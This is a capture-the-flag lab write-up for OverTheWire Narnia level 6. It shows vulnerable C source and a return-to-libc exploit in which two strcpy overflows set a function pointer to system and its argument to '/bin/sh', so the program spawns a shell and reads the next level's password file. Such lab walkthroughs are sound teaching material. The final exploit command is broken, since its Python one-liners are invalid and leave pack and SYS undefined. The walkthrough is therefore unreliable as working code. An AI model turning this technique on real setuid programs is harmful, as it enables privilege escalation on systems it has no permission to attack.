# OverTheWire — Narnia Level 6 → 7

> Goal: Get narnia7 password from `narnia6`. Result: **`**********`** (hidden)
> Technique: two `strcpy` overflows → overwrite function pointer → **return-to-libc** (`system`).

---

## 1. Connection
```bash
ssh narnia6@narnia.labs.overthewire.org -p 2226
```

## 2. Source (from real binary — `setreuid` IS present)
```c
unsigned long get_sp(void){ __asm__("movl %esp,%eax\n\t" "and $0xff000000, %eax"); }
int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int (*fp)(char*) = (int(*)(char*))&puts;
    if(argc!=3){ ...; exit(-1); }
    for(i=0; environ[i]; i++) memset(environ[i],0,strlen(environ[i]));   // wipe env
    for(i=3; argv[i]; i++)    memset(argv[i],0,strlen(argv[i]));         // wipe argv[3+]
    strcpy(b1,argv[1]);                       // b1 overflows -> overwrites fp
    strcpy(b2,argv[2]);                       // b2 overflows -> overwrites b1
    if(((unsigned long)fp & 0xff000000) == get_sp()) exit(-1);   // fp points to stack -> EXIT
    setreuid(geteuid(),geteuid());
    fp(b1);                                   // if fp==system: system(b1)
}
```
> ✅ **Live confirmation:** Earlier I suspected `setreuid` was missing from source — that was
> wrong. The real binary **does** have `setreuid(geteuid(),geteuid())` before `fp(b1)`.

## 3. Vulnerability + obstacle
Two unchecked `strcpy`s. Stack layout is `[b2][b1][fp]` → overflowing `b1` reaches `fp`,
overflowing `b2` reaches `b1`.
- **`get_sp()` ≈ `0xff000000`:** `fp` cannot point to the stack (`0xff..`) → stack shellcode FORBIDDEN.
- **`system` is in libc** (`0xf7..`) → `0xf7000000 != 0xff000000` → passes the guard. Only path: ret2libc.

## 4. `system` address (ASLR disabled)
gdb works on narnia but a helper is cleaner (ASLR off → helper's libc `system` address = target's):
```c
int main(){ printf("SYS=%p\n", (void*)&system); return 0; }   // gcc -m32
# SYS=f7dd18e0  (from live solve)
```

## 5. Exploit — order matters
```
argv[1] = "A"*8 + pack(system)     # strcpy(b1): b1 fills, overflow sets fp=system
argv[2] = "B"*8 + "/bin/sh"        # strcpy(b2): b2 fills, overflow sets b1="/bin/sh"
```
`strcpy(b1)` FIRST → fp=system; `strcpy(b2)` SECOND → b1="/bin/sh" (b2 overflow only
reaches b1, does not corrupt fp). Result: `fp(b1) = system("/bin/sh")`.
```bash
# environ wiped -> no PATH -> absolute paths
python3 -c 'timed: "/usr/bin/id; /bin/cat /etc/narnia_pass/narnia7"' | \
  /narnia/narnia6 "$(python3 -c "b'A'*8 + pack('<I', SYS)")" 'BBBBBBBB/bin/sh'
```
Output: `uid=14007(narnia7)` → password.


## Lessons
| Topic | Note |
|-------|------|
| Function pointer | Adjacent buffer overflow corrupts `fp` |
| Stack guard (`get_sp`) | Forbids stack addresses (`0xff..`) → ret2libc required |
| ret2libc | `fp=system`, write argument (`"/bin/sh"`) into `b1` → `system("/bin/sh")` |
| Order | First b1→fp, then b2→b1 (b2 overflow doesn't reach fp) |
| system address | ASLR off → helper's `&system` = target's |
